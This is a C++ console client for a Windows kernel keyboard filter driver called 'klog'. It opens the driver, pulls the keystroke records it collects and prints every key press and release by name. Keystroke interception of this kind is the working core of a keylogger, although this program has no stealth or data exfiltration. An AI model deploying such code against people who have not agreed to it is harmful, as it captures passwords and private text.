#include "klog_driver/public.h"

#include <basetyps.h>
#include <stdlib.h>
#include <wtypes.h>
#include <initguid.h>
#include <stdio.h>
#include <string.h>
#include <conio.h>
#include <ntddkbd.h>

#pragma warning(disable:4201)

#include <setupapi.h>
#include <winioctl.h>

#pragma warning(default:4201)

#include <iostream>

// {2BC64703-9672-4D43-9142-F444592D836C}
DEFINE_GUID(GUID_DEVINTERFACE_KLOG,
            0x2bc64703, 0x9672, 0x4d43, 0x91, 0x42, 0xf4, 0x44, 0x59, 0x2d, 0x83, 0x6c);

int main(int argc, const char* argv)
{   
    UNREFERENCED_PARAMETER(argc);
    UNREFERENCED_PARAMETER(argv);

    KEYBOARD_INPUT_DATA                 inpData[KEYBOARD_INP_BUFFER_SIZE] = {0};
    HDEVINFO                            hardwareDeviceInfo;
    SP_DEVICE_INTERFACE_DATA            deviceInterfaceData;
    PSP_DEVICE_INTERFACE_DETAIL_DATA    deviceInterfaceDetailData = NULL;
    ULONG                               predictedLength = 0;
    ULONG                               requiredLength = 0, bytes = 0;
    HANDLE                              device = NULL;
    HANDLE                              inputDataAddedEvent = NULL;
    ULONG                               i = 0;

    const char* keytable[] = {
        "[INVALID]",
        "`",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "0",
        "-",
        "=",
        "[BACKSPACE]",
        "[INVALID]",
        "q",
        "w",
        "e",
        "r",
        "t",
        "y",
        "u",
        "i",
        "o",
        "p",
        "[",
        "]",
        "[ENTER]",
        "[CTRL]",
        "a",
        "s",
        "d",
        "f",
        "g",
        "h",
        "j",
        "k",
        "l",
        ";",
        "\'",
        "'",
        "[LSHIFT]",
        "\\",
        "z",
        "x",
        "c",
        "v",
        "b",
        "n",
        "m",
        ",",
        ".",
        "/",
        "[RSHIFT]",
        "[INVALID]",
        "[ALT]",
        "[SPACE]",
        "[INVALID]",
        "[INVALID]",
        "[INVALID]",
        "[INVALID]",
        "[INVALID]",
        "[INVALID]",
        "[INVALID]",
        "[INVALID]",
        "[INVALID]",
        "[INVALID]",
        "[INVALID]",
        "[INVALID]",
        "[INVALID]",
        "7",
        "8",
        "9",
        "[INVALID]",
        "4",
        "5",
        "6",
        "[INVALID]",
        "1",
        "2",
        "3",
        "0"
    };

    constexpr int SizeOfKeyTable = sizeof(keytable) / sizeof(keytable[0]);

    hardwareDeviceInfo = SetupDiGetClassDevs((LPGUID) &GUID_DEVINTERFACE_KLOG, NULL,NULL,
                                             (DIGCF_PRESENT | DIGCF_DEVICEINTERFACE));
    if (hardwareDeviceInfo == INVALID_HANDLE_VALUE) {
        std::cerr << "SetupDiGetClassDevs failed. Error code 0x"
            << std::uppercase << std::hex << GetLastError() << "\n";
        goto error_exit;
    }

    deviceInterfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

    std::cout << "List of KBFILTER Device Interfaces:\n";

    while (true) {
        if (SetupDiEnumDeviceInterfaces(hardwareDeviceInfo, NULL,
                                        (LPGUID) &GUID_DEVINTERFACE_KLOG, i, &deviceInterfaceData)) {
            if (deviceInterfaceDetailData) {
                std::free(deviceInterfaceDetailData);
                deviceInterfaceDetailData = NULL;
            }

            if (!SetupDiGetDeviceInterfaceDetail(hardwareDeviceInfo, &deviceInterfaceData,
                                                 NULL, 0, &requiredLength, NULL)) {
                if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
                    std::cerr << "SetupDiGetDeviceInterfaceDetail failed when retrieving "
                        << "device interface data. Error code 0x"
                        << std::uppercase << std::hex << GetLastError() << "\n";
                    goto error_exit;
                }
            }

            predictedLength = requiredLength;
            deviceInterfaceDetailData = (PSP_DEVICE_INTERFACE_DETAIL_DATA) std::malloc(predictedLength);
            if (deviceInterfaceDetailData) {
                deviceInterfaceDetailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA);
            }
            else {
                std::cerr << "Unable to allocate " << predictedLength << " bytes for device interface details.\n";
                goto error_exit;
            }

            if (!SetupDiGetDeviceInterfaceDetail(hardwareDeviceInfo, &deviceInterfaceData,
                                                 deviceInterfaceDetailData,
                                                 predictedLength, &requiredLength, NULL)) {
                std::cerr << "SetupDiGetDeviceInterfaceDetail failed when retrieving "
                    << "device interface detail data. Error code 0x"
                    << std::uppercase << std::hex << GetLastError() << "\n";
                goto error_exit;
            }

            std::wcout << L"Device " << ++i << L": " 
                << deviceInterfaceDetailData->DevicePath << L"\n";
        }
        else if (GetLastError() != ERROR_NO_MORE_ITEMS) {
            std::free(deviceInterfaceDetailData);
            deviceInterfaceDetailData = NULL;
            continue;
        }
        else {
            break;
        }
    }

    SetupDiDestroyDeviceInfoList(hardwareDeviceInfo);
    
    if (!deviceInterfaceDetailData) {
        std::cout << "No device interfaces present\n";
        return 0;
    }

    std::wcout << L"Opening the last interface: " << deviceInterfaceDetailData->DevicePath << L"\n";

    device = CreateFile(deviceInterfaceDetailData->DevicePath, GENERIC_READ | GENERIC_WRITE,
                        0, NULL, OPEN_EXISTING, 0, NULL);
    if (device == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open driver via device path. Error code 0x"
            << std::uppercase << std::hex << GetLastError() << "\n";
        goto error_exit;
    }

    std::free(deviceInterfaceDetailData);
    deviceInterfaceDetailData = NULL;

    if (!DeviceIoControl(device, IOCTL_KLOG_INIT, NULL, 0,
                         &inpData, sizeof(inpData), &bytes, NULL)) {
        std::cerr << "Initialization of klog failed with status code 0x"
            << std::uppercase << std::hex << GetLastError() << "\n";
        goto error_exit;
    }

    inputDataAddedEvent = OpenEvent(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, UM_NOTIF_EVENT_NAME);
    if (!inputDataAddedEvent) {
        std::cerr << "Failed to open KeyboardInputDataAddedEvent. Status code 0x"
            << std::uppercase << std::hex << GetLastError() << "\n";
        goto error_exit;
    }

    while (true) {
        DWORD waitResult = WaitForSingleObject(inputDataAddedEvent, INFINITE);

        if (waitResult == WAIT_OBJECT_0) {
            if (!DeviceIoControl(device, IOCTL_KLOG_GET_INPUT_DATA, NULL, 0,
                                 &inpData, sizeof(inpData), &bytes, NULL)) {
                std::cerr << "Retrieve Keyboard Input Data request failed with status code 0x"
                    << std::uppercase << std::hex << GetLastError() << "\n";
                ResetEvent(inputDataAddedEvent);
                goto error_exit;
            }
        }
        else {
            std::cerr << "WaitForSingleObject failed with status code 0x"
                << std::uppercase << std::hex << GetLastError() << "\n";
            break;
        }

        if (bytes > 0) {
            std::cout << "Pressed keys:\n";
            for (ULONG k = 0; k < (bytes / sizeof(inpData[0])); ++k) {
                std::string keyAction = "N/A";
                if (inpData[k].Flags == KEY_MAKE) {
                    keyAction = "Pressed";
                }
                else if (inpData[k].Flags == KEY_BREAK) {
                    keyAction = "Released";
                }

                if (inpData[k].MakeCode >= 0 && inpData[k].MakeCode < SizeOfKeyTable) {
                    std::cout << "{" << keytable[inpData[k].MakeCode] << " - " << keyAction << "}; ";
                }
                else {
                    std::cerr << "Incorrect MakeCode\n";
                }
            }
            std::cout << "\n";
        }

        ResetEvent(inputDataAddedEvent);
    }

    ResetEvent(inputDataAddedEvent);
    CloseHandle(device);

    return 0;

error_exit:
    if (device) {
        CloseHandle(device);
    }
    if (hardwareDeviceInfo) {
        SetupDiDestroyDeviceInfoList(hardwareDeviceInfo);
    }
    if (deviceInterfaceDetailData) {
        std::free(deviceInterfaceDetailData);
    }
    if (inputDataAddedEvent) {
        ResetEvent(inputDataAddedEvent);
        CloseHandle(inputDataAddedEvent);
    }

    return 1;
}
